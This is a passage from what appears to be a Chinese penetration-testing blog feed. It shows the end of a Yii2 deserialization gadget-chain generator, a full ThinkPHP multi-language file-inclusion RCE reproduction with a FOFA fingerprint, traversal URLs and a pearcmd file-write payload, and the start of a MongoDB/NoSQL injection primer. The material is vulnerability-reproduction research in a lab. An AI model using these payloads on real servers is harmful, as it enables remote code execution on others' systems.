class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Codeception<span class="token punctuation">\</span>Util<span class="token punctuation">\</span>XmlBuilder</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Swift_KeyCache_DiskKeyCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$keys</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$path</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">keys</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'hello'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'world'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XmlBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Swift_KeyCache_DiskKeyCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Yii2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 多语言文件包含漏洞 RCE</title>
      <link href="/2023/01/28/penetrationstest/lou-dong-fu-xian/thinkphp/thinkphp-duo-yu-yan-wen-jian-bao-han-lou-dong-rce/"/>
      <url>/2023/01/28/penetrationstest/lou-dong-fu-xian/thinkphp/thinkphp-duo-yu-yan-wen-jian-bao-han-lou-dong-rce/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-多语言文件包含漏洞-RCE"><a href="#ThinkPHP-多语言文件包含漏洞-RCE" class="headerlink" title="ThinkPHP 多语言文件包含漏洞 RCE"></a>ThinkPHP 多语言文件包含漏洞 RCE</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Thinkphp，v6.0.1~v6.0.13，v5.0.x，v5.1.x</p><h2 id="fofa指纹"><a href="#fofa指纹" class="headerlink" title="fofa指纹"></a>fofa指纹</h2><p>header=”think_lang”</p><h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。</p><h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><p>开启多语言功能</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="ThinkPHP-6-环境"><a href="#ThinkPHP-6-环境" class="headerlink" title="ThinkPHP 6 环境"></a>ThinkPHP 6 环境</h3><p>使用 composer 拉取 ThinkPHP</p><pre class="line-numbers language-none"><code class="language-none">composer create-project topthink/think=6.0.12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者去 github 上 clone 一个下来</p><p><a href="https://github.com/top-think/framework/releases">https://github.com/top-think/framework/releases</a></p><p><a href="https://github.com/top-think/think/releases/">https://github.com/top-think/think/releases/</a></p><p>然后修改 composer.json 拉取 6.0.12</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"require"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"php"</span><span class="token operator">:</span> <span class="token string">"&gt;=7.2.5"</span><span class="token punctuation">,</span>    <span class="token property">"topthink/framework"</span><span class="token operator">:</span> <span class="token string">"6.0.12"</span><span class="token punctuation">,</span>    <span class="token property">"topthink/think-orm"</span><span class="token operator">:</span> <span class="token string">"^2.0"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行 </p><pre class="line-numbers language-none"><code class="language-none">composer install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启多语言功能</p><p>app/middleware.php </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 全局中间件定义文件</span><span class="token keyword">return</span> <span class="token punctuation">[</span>    <span class="token comment">// 全局请求缓存</span>    <span class="token comment">// \think\middleware\CheckRequestCache::class,</span>    <span class="token comment">// 多语言加载</span>    <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>middleware<span class="token punctuation">\</span>LoadLangPack</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span>    <span class="token comment">// Session初始化</span>    <span class="token comment">// \think\middleware\SessionInit::class</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 docker 环境</p><p>Dockerfile</p><pre class="line-numbers language-none"><code class="language-none">FROM ctfhub/base_web_nginx_mysql_php_74COPY ./think/ /var/www/html/EXPOSE 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">docker build . -t thinkphpdocker run -d -p 10012:80 thinkphp:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ThinkPHP-5-环境"><a href="#ThinkPHP-5-环境" class="headerlink" title="ThinkPHP 5 环境"></a>ThinkPHP 5 环境</h3><p>使用 composer 拉取 ThinkPHP</p><pre class="line-numbers language-none"><code class="language-none">composer create-project topthink/think=5.1.38<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者去 github 上 clone 一个下来</p><p><a href="https://github.com/top-think/framework/releases">https://github.com/top-think/framework/releases</a></p><p><a href="https://github.com/top-think/think/releases/">https://github.com/top-think/think/releases/</a></p><p>然后修改 composer.json 拉取 5.1.38</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"require"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"php"</span><span class="token operator">:</span> <span class="token string">"&gt;=5.6.0"</span><span class="token punctuation">,</span>    <span class="token property">"topthink/framework"</span><span class="token operator">:</span> <span class="token string">"5.1.38"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行 </p><pre class="line-numbers language-none"><code class="language-none">composer install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启多语言功能</p><p><a href="https://static.kancloud.cn/manual/thinkphp5/118132">https://static.kancloud.cn/manual/thinkphp5/118132</a></p><p><a href="https://blog.csdn.net/w263756314/article/details/114079151">https://blog.csdn.net/w263756314/article/details/114079151</a></p><p>config/app.php</p><p>application/config.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'lang_switch_on'</span>         <span class="token operator">=&gt;</span> <span class="token constant boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>以 ThinkPHP 6 为例</p><p>测试访问 </p><pre class="line-numbers language-none"><code class="language-none">http://192.168.1.101:10012/public/index.php?lang=../../../../../public/index<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221210234736.png"></p><p>成功实现文件包含，结合  pearcmd.php 进行写入任意文件</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.1.101:10012/public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+-c+/tmp/hello.php+-d+man_dir=&lt;?=phpinfo();?&gt;+-s+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过 URL 传入会进行 URL 编码，因此在 BP 中发包</p><p><img src="/../../../../pic/Pasted%20image%2020221211000412.png"></p><p>查看容器</p><p><img src="/../../../../pic/Pasted%20image%2020221211000438.png"></p><p>成功写入到了文件之中，然后包含该文件即可</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.1.101:10012/public/index.php?lang=../../../../../../../../tmp/hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221211000506.png"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>跟进下文件包含原理</p><p>在  <code>\think\middleware\LoadLangPack::handle</code> 下打个断点</p><p><img src="/../../../../pic/Pasted%20image%2020221211002113.png"></p><p>进入 detect 中</p><p><img src="/../../../../pic/Pasted%20image%2020221211002454.png"></p><p>检测 <code>config['detect_var']</code> 查看 <code>config</code> 后可知即为传入的 <code>lang</code> 参数，未经过滤即写入到 <code>$langSet</code> 中</p><p><img src="/../../../../pic/Pasted%20image%2020221211003248.png"></p><p>然后将传入参数扔到 <code>switchLangSet</code>  进行下一步匹配</p><p><img src="/../../../../pic/Pasted%20image%2020221211003533.png"></p><p>加载语言包中直接将传入的 <code>lang</code> 加载到路径之中</p><p><img src="/../../../../pic/Pasted%20image%2020221211003627.png"></p><p>进一步解析文件</p><p><img src="/../../../../pic/Pasted%20image%2020221211003656.png"></p><p>将指定文件包含</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://tttang.com/archive/1865/">https://tttang.com/archive/1865/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p><p><a href="../../../ZDemo/Trick/PHP/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/PEAR%20%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6.md">PEAR 创建文件</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nosql 注入从零到一</title>
      <link href="/2023/01/28/penetrationstest/shen-tou-ji-qiao/sql-zhu-ru/nosql-zhu-ru-cong-ling-dao-yi/"/>
      <url>/2023/01/28/penetrationstest/shen-tou-ji-qiao/sql-zhu-ru/nosql-zhu-ru-cong-ling-dao-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="Nosql-注入从零到一"><a href="#Nosql-注入从零到一" class="headerlink" title="Nosql 注入从零到一"></a>Nosql 注入从零到一</h1><p>#Nosql </p><h2 id="1-什么是-Nosql"><a href="#1-什么是-Nosql" class="headerlink" title="1. 什么是 Nosql"></a>1. 什么是 Nosql</h2><p>NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。</p><h2 id="2-什么是-MongoDB"><a href="#2-什么是-MongoDB" class="headerlink" title="2. 什么是 MongoDB"></a>2. 什么是 MongoDB</h2><p><a href="https://www.mongodb.com/try/download/community">MongoDB</a> 是当前最流行的 NoSQL 数据库产品之一，由 C++ 语言编写，是一个基于分布式文件存储的数据库。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。</p><p>MongoDB 将数据存储为一个文档，数据结构由键值（key=&gt;value）对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">{</span>    <span class="token string">"_id"</span> <span class="token operator">:</span> <span class="token function">ObjectId</span><span class="token punctuation">(</span><span class="token string">"60fa854cf8aaaf4f21049148"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"name"</span> <span class="token operator">:</span> <span class="token string">"whoami"</span><span class="token punctuation">,</span>    <span class="token string">"description"</span> <span class="token operator">:</span> <span class="token string">"the admin user"</span><span class="token punctuation">,</span>    <span class="token string">"age"</span> <span class="token operator">:</span> <span class="token number">19</span><span class="token punctuation">,</span>    <span class="token string">"status"</span> <span class="token operator">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span>    <span class="token string">"groups"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"admins"</span><span class="token punctuation">,</span>        <span class="token string">"users"</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-MongoDB-基础概念解析"><a href="#3-MongoDB-基础概念解析" class="headerlink" title="3. MongoDB 基础概念解析"></a>3. MongoDB 基础概念解析</h2><p>不管我们学习什么数据库都应该学习其中的基础概念，在 MongoDB 中基本的概念有文档、集合、数据库，如下表所示：</p><table><thead><tr><th>SQL概念</th><th>MongoDB 概念</th><th>说明</th></tr></thead><tbody><tr><td>database</td><td>database</td><td>数据库</td></tr><tr><td>table</td><td>collection</td><td>数据库表/集合</td></tr><tr><td>row</td><td>document</td><td>数据记录行/文档</td></tr><tr><td>column</td><td>field</td><td>数据字段/域</td></tr><tr><td>index</td><td>index</td><td>索引</td></tr><tr><td>table joins</td><td></td><td>表连接，MongoDB 不支持</td></tr><tr><td>primary key</td><td>primary key</td><td>主键，MongoDB 自动将 _id 字段设置为主键</td></tr></tbody></table><p>下表列出了关系型数据库 RDBMS 与 MongoDB 之间对应的术语：</p><table><thead><tr><th>RDBMS</th><th>MongoDB</th></tr></thead><tbody><tr><td>数据库</td><td>数据库</td></tr><tr><td>表格</td><td>集合</td></tr><tr><td>行</td><td>文档</td></tr><tr><td>列</td><td>字段</td></tr><tr><td>表联合</td><td>嵌入文档</td></tr><tr><td>主键</td><td>主键（MongoDB 提供了 key 为 _id</td></tr></tbody></table><h3 id="3-1-数据库（Database）"><a href="#3-1-数据库（Database）" class="headerlink" title="3.1 数据库（Database）"></a>3.1 数据库（Database）</h3><p>个 MongoDB 中可以建立多个数据库。MongoDB 的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和权限，不同的数据库也放置在不同的文件中。</p><p>使用 show dbs 命令可以显示所有数据库的列表：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&gt;</span> <span class="token keyword">show</span> dbsadmin   <span class="token number">0.000</span>GBconfig  <span class="token number">0.000</span>GB<span class="token keyword">local</span>   <span class="token number">0.000</span>GB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>执行 db 命令可以显示当前数据库对象或集合：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&gt;</span> dbtest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-2-文档（Document）"><a href="#3-2-文档（Document）" class="headerlink" title="3.2 文档（Document）"></a>3.2 文档（Document）</h3><p>文档是一组键值（key-value）对，类似于 RDBMS 关系型数据库中的一行。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是 MongoDB 非常突出的特点。</p><p>一个简单的文档例子如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">{<span class="token string">"name"</span>:<span class="token string">"whoami"</span><span class="token punctuation">,</span> <span class="token string">"age"</span>:<span class="token number">19</span>}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-集合（Collection）"><a href="#3-3-集合（Collection）" class="headerlink" title="3.3 集合（Collection）"></a>3.3 集合（Collection）</h3><p>集合就是 MongoDB 文档组，类似于 RDBMS 关系数据库管理系统中的表格。集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据。</p><p>比如，我们可以将以下不同数据结构的文档插入到集合中：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">{<span class="token string">"name"</span>:<span class="token string">"whoami"</span>}{<span class="token string">"name"</span>:<span class="token string">"bunny"</span><span class="token punctuation">,</span> <span class="token string">"age"</span>:<span class="token number">19</span>}{<span class="token string">"name"</span>:<span class="token string">"bob"</span><span class="token punctuation">,</span> <span class="token string">"age"</span>:<span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">"groups"</span>:<span class="token punctuation">[</span><span class="token string">"admins"</span><span class="token punctuation">,</span><span class="token string">"users"</span><span class="token punctuation">]</span>}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当插入一个文档时，集合就会被自动创建。</p><p>如果我们要查看已有集合，可以使用 show collections 或 show tables 命令：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&gt;</span> <span class="token keyword">show</span> collectionsall_users<span class="token operator">&gt;</span> <span class="token keyword">show</span> <span class="token keyword">tables</span>all_users<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-MongoDB-基础语法解析"><a href="#4-MongoDB-基础语法解析" class="headerlink" title="4. MongoDB 基础语法解析"></a>4. MongoDB 基础语法解析</h2><h3 id="4-1-MongoDB-创建数据库"><a href="#4-1-MongoDB-创建数据库" class="headerlink" title="4.1 MongoDB 创建数据库"></a>4.1 MongoDB 创建数据库</h3><p>MongoDB 创建数据库的语法格式如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">use</span> DATABASE_NAME<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果数据库不存在，则创建数据库，否则切连接并换到指定数据库，是不是很方便！</p><p>以下实例我们创建了数据库 users:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&gt;</span> <span class="token keyword">use</span> usersswitched <span class="token keyword">to</span> db users<span class="token operator">&gt;</span> dbusers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-MongoDB-创建集合"><a href="#4-2-MongoDB-创建集合" class="headerlink" title="4.2 MongoDB 创建集合"></a>4.2 MongoDB 创建集合</h3><p>MongoDB 中我们使用 createCollection() 方法来创建集合。其语法格式如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>createCollection<span class="token punctuation">(</span>name<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数说明：</p><ul><li>name：要创建的集合名称</li><li>options：可选参数，指定有关内存大小及索引的选项</li></ul><p>如下实例，我们在 users 数据库中创建一个 all_users 集合：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&gt;</span> <span class="token keyword">use</span> usersswitched <span class="token keyword">to</span> db users<span class="token operator">&gt;</span> db<span class="token punctuation">.</span>createCollection<span class="token punctuation">(</span><span class="token string">"all_users"</span><span class="token punctuation">)</span>{ <span class="token string">"ok"</span> : <span class="token number">1</span> }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-3-MongoDB-插入文档"><a href="#4-3-MongoDB-插入文档" class="headerlink" title="4.3 MongoDB 插入文档"></a>4.3 MongoDB 插入文档</h3><p>在 MongoDB 中我们可以使用 insert() 方法向集合中插入文档，语法如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>COLLECTION_NAME<span class="token punctuation">.</span><span class="token keyword">insert</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下实例，我们向存储在 users 数据库的 all_users 集合中插入一个文档：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>all_users<span class="token punctuation">.</span><span class="token keyword">insert</span><span class="token punctuation">(</span>{name: <span class="token string">'whoami'</span><span class="token punctuation">,</span> description: <span class="token string">'the admin user'</span><span class="token punctuation">,</span>age: <span class="token number">19</span><span class="token punctuation">,</span><span class="token keyword">status</span>: <span class="token string">'A'</span><span class="token punctuation">,</span>groups: <span class="token punctuation">[</span><span class="token string">'admins'</span><span class="token punctuation">,</span> <span class="token string">'users'</span><span class="token punctuation">]</span>}<span class="token punctuation">)</span>WriteResult<span class="token punctuation">(</span>{ <span class="token string">"nInserted"</span> : <span class="token number">1</span> }<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们也可以将文档数据定义为一个变量，然后再执行插入操作将变量插入</p><h3 id="4-4-MongoDB-更新文档"><a href="#4-4-MongoDB-更新文档" class="headerlink" title="4.4 MongoDB 更新文档"></a>4.4 MongoDB 更新文档</h3><p>在 MongoDB 中我们可以使用 update() 或 save() 方法来更新集合中的文档。</p><p>update() 方法</p><p>update() 方法用于更新已存在的文档。语法格式如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>collection<span class="token punctuation">.</span><span class="token keyword">update</span><span class="token punctuation">(</span>   <span class="token operator">&lt;</span>query<span class="token operator">&gt;</span><span class="token punctuation">,</span>   <span class="token operator">&lt;</span><span class="token keyword">update</span><span class="token operator">&gt;</span><span class="token punctuation">,</span>   {     upsert: <span class="token operator">&lt;</span><span class="token keyword">boolean</span><span class="token operator">&gt;</span><span class="token punctuation">,</span>     multi: <span class="token operator">&lt;</span><span class="token keyword">boolean</span><span class="token operator">&gt;</span><span class="token punctuation">,</span>     writeConcern: <span class="token operator">&lt;</span>document<span class="token operator">&gt;</span>   }<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数说明：</p><ul><li>query：update 操作的查询条件，类似 sql update 语句中 where 子句后面的内容。</li><li>update：update 操作的对象和一些更新的操作符（如 $set）等，可以理解为 sql update 语句中 set 关键字后面的内容。</li><li>multi：可选，默认是 false，只更新找到的第一条记录，如果这个参数为 true，就把按条件查出来多条记录全部更新。</li></ul><p>接着我们通过 update() 方法来将年龄 age 从 19 更新到 20：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&gt;</span> db<span class="token punctuation">.</span>lover<span class="token punctuation">.</span><span class="token keyword">update</span><span class="token punctuation">(</span>{<span class="token string">'age'</span>:<span class="token number">19</span>}<span class="token punctuation">,</span> {$<span class="token keyword">set</span>:{<span class="token string">'age'</span>:<span class="token number">20</span>}}<span class="token punctuation">)</span>WriteResult<span class="token punctuation">(</span>{ <span class="token string">"nMatched"</span> : <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"nUpserted"</span> : <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"nModified"</span> : <span class="token number">0</span> }<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&gt;</span> db<span class="token punctuation">.</span>all_users<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pretty<span class="token punctuation">(</span><span class="token punctuation">)</span>{    <span class="token string">"_id"</span> : ObjectId<span class="token punctuation">(</span><span class="token string">"60fa854cf8aaaf4f21049148"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"name"</span> : <span class="token string">"whoami"</span><span class="token punctuation">,</span>    <span class="token string">"description"</span> : <span class="token string">"the admin user"</span><span class="token punctuation">,</span>    <span class="token string">"age"</span> : <span class="token number">20</span><span class="token punctuation">,</span>    <span class="token string">"status"</span> : <span class="token string">"A"</span><span class="token punctuation">,</span>    <span class="token string">"groups"</span> : <span class="token punctuation">[</span>        <span class="token string">"admins"</span><span class="token punctuation">,</span>        <span class="token string">"users"</span>    <span class="token punctuation">]</span>}<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功将 age 从 19 改为了 20。</p><p>以上语句只会修改第一条发现的文档，如果你要修改多条相同的文档，则需要设置 multi 参数为 true。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&gt;</span> db<span class="token punctuation">.</span>lover<span class="token punctuation">.</span><span class="token keyword">update</span><span class="token punctuation">(</span>{<span class="token string">'age'</span>:<span class="token string">'19'</span>}<span class="token punctuation">,</span> {$<span class="token keyword">set</span>:{<span class="token string">'age'</span>:<span class="token number">20</span>}}<span class="token punctuation">,</span> {multi:<span class="token boolean">true</span>}<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>save() 方法</p><p>save() 方法通过传入的文档来替换已有文档，_id 主键存在就更新，不存在就插入。语法格式如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>collection<span class="token punctuation">.</span><span class="token keyword">save</span><span class="token punctuation">(</span>   <span class="token operator">&lt;</span>document<span class="token operator">&gt;</span><span class="token punctuation">,</span>   {     writeConcern: <span class="token operator">&lt;</span>document<span class="token operator">&gt;</span>   }<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数说明：</p><ul><li>document：文档数据。</li></ul><p>如下实例中我们替换了 _id 为 60fa854cf8aaaf4f21049148 的文档数据：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&gt;</span> db<span class="token punctuation">.</span>all_users<span class="token punctuation">.</span><span class="token keyword">save</span><span class="token punctuation">(</span>{    <span class="token string">"_id"</span> : ObjectId<span class="token punctuation">(</span><span class="token string">"60fa854cf8aaaf4f21049148"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"name"</span> : <span class="token string">"whoami"</span><span class="token punctuation">,</span>    <span class="token string">"description"</span> : <span class="token string">"the admin user"</span><span class="token punctuation">,</span>    <span class="token string">"age"</span> : <span class="token number">21</span><span class="token punctuation">,</span>    <span class="token string">"status"</span> : <span class="token string">"A"</span><span class="token punctuation">,</span>    <span class="token string">"groups"</span> : <span class="token punctuation">[</span>        <span class="token string">"admins"</span><span class="token punctuation">,</span>        <span class="token string">"users"</span>    <span class="token punctuation">]</span>}<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-5-MongoDB-查询文档"><a href="#4-5-MongoDB-查询文档" class="headerlink" title="4.5 MongoDB 查询文档"></a>4.5 MongoDB 查询文档</h3><p>在 MongoDB 中我们可以使用 find() 方法来查询文档。find() 方法以非结构化的方式来显示所有文档。其语法格式如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>collection<span class="token punctuation">.</span>find<span class="token punctuation">(</span>query<span class="token punctuation">,</span> projection<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数说明：</p><ul><li>query：可选，使用查询操作符指定查询条件，相当于 sql select 语句中的 where 子句。</li><li>projection：可选，使用投影操作符指定返回的键。</li></ul><p>如下实例我们查询了集合 all_users 中的 age 为 20 的数据：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&gt;</span> db<span class="token punctuation">.</span>all_users<span class="token punctuation">.</span>find<span class="token punctuation">(</span>{<span class="token string">"age"</span>:<span class="token string">"20"</span>}<span class="token punctuation">)</span>{ <span class="token string">"_id"</span> : 